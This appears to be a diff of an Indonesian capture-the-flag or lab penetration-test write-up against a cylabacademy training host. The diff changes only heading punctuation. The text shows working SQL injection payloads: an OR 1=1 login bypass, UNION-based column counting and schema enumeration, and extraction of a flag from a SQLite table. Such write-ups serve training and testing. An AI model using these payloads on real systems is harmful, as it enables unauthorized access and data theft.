@@ -36,12 +36,12 @@ Objektif pengujian (NIST SP 800-115 / OWASP WSTG-INPV-05): Menganalisis paramete
    - Akses ke `http://chatelaine.cylabacademy.net:23408/` menampilkan form login dengan parameter `username` dan `password`.
    - Mengirim masukan sembarang menghasilkan error internal HTTP 500 yang membocorkan struktur query SQL mentah:
      `SQL query: SELECT id FROM users WHERE password = '...' AND username = '...'`
-2. Tahap 1 — Bypass Otentikasi Login:
+2. Tahap 1: Bypass Otentikasi Login:
    - Menyusun payload injeksi pada field `password`: `' OR 1=1 -- `
    - Mengirim request POST login:
      `username=admin&password=%27+OR+1%3D1+--+`
    - Server mengembalikan status HTTP 200 dan mengarahkan sesi ke `welcome.php` (tampilan daftar kantor cabang).
-3. Tahap 2 — Enumerasi Skema Basis Data SQLite:
+3. Tahap 2: Enumerasi Skema Basis Data SQLite:
    - Formulir pencarian pada `welcome.php` mengirimkan request POST dengan parameter `search` dan `submit=Search`.
    - Menguji jumlah kolom via UNION query:
      `search=' UNION SELECT 1, 2, 3 -- `
@@ -53,7 +53,7 @@ Objektif pengujian (NIST SP 800-115 / OWASP WSTG-INPV-05): Menganalisis paramete
      - `more_table` (`CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)`)
      - `offices` (`CREATE TABLE offices (...)`)
      - `users` (`CREATE TABLE users (...)`)
-4. Tahap 3 — Eksfiltrasi Flag Resmi:
+4. Tahap 3: Eksfiltrasi Flag Resmi:
    - Mengekstrak isi kolom `flag` dari tabel `more_table`:
      `search=' UNION SELECT flag, id, 3 FROM more_table -- `
    - Server merender isi tabel yang memuat token flag:
